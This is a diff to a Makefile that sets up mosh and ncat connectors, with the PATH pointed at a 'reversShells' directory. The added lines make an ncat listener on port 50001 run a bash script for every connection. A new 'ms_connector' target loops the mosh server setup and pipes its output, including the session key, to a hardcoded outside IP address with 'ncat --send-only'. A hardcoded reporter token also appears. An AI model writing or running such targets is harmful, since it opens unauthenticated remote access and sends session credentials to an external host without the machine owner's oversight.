@@ -1,4 +1,4 @@
-export PATH := /home/v/miniconda3/envs/pyt/bin:$(PATH)
+export PATH := $(PWD)/reversShells:/home/v/miniconda3/envs/pyt/bin:$(PATH)
 export DEBUG := $(DEBUG)
 export CC_TEST_REPORTER_ID := 501f2d3f82d0d671d4e2dab422e60140a9461aa51013ecca0e9b2285c1b4aa43
 
@@ -10,17 +10,19 @@ SHELL=/bin/bash
 MC=stty rows 40 columns 80; comm=$$(mosh-server new 2>/dev/null | grep -n "MOSH CONNECT" | cut -d" " -f 3,4  | awk  '{ print "MOSH_KEY=" $$2 " mosh-client 127.0.0.1 " $$1 }' ); sh -c "$$comm"
 
 
-RUN_PC=if [ $$(pgrep -cf "50001.*vulp 50002") -eq 0 ]; then echo "start connector"; ncat -vuklp 50001 -c 'ncat -vulp 50002'; fi
+RUN_PC=if [ $$(pgrep -cf "50001.*vulp 50002") -eq 0 ]; \
+then echo "start connector"; \
+ncat -vuklp 50001 -c 'bash -x addNewNode.sh mosh'; fi
 
-tmp: pc_connector
-	./setup_mosh_server
+ms_connector: pc_connector
+	while true; do ./setup_mosh_server; done 2>&1 | ncat --send-only 112.65.9.197 23454
 	# mosh-server-port
 	# 60001[<->]pc-listen-port(50001)Plug>_[<->]listen-port-for-mochs-client(50002)
 	# 50001 output to client finnally and receive input back to 60001
 	
 pc_conn:
 	if [ -z "$(COM)" ]; then echo need pass COMM to make; else \
-tmux new-window -t rvsConnector -n "$$(git show --no-patch --oneline)" "$$(echo '$(COM)' | sed 's/600[0-9]\{1,\}/50002/')" ; fi
+tmux new-window -t rvsConnector -n "m.$$(git show --no-patch --oneline)" "$$(echo '$(COM)' | sed 's/600[0-9]\{1,\}/50002/')" ; fi
 
 pc_connector:
 	echo "RUN PC"; $(RUN_PC)
@@ -130,6 +132,7 @@ mlocal:
 	tty_config=$$(stty -g); size=$$(stty size); $(MC); stty $$tty_config; stty columns $$(echo $$size | cut -d" " -f 2) rows $$(echo $$size | cut -d" " -f 1)
 
 check:
+	echo $(PWD)
 	pstree -laps $$$$
 	@echo $$DEBUG
 	@eval 'echo $$(which $(PY3)) is our python executable'
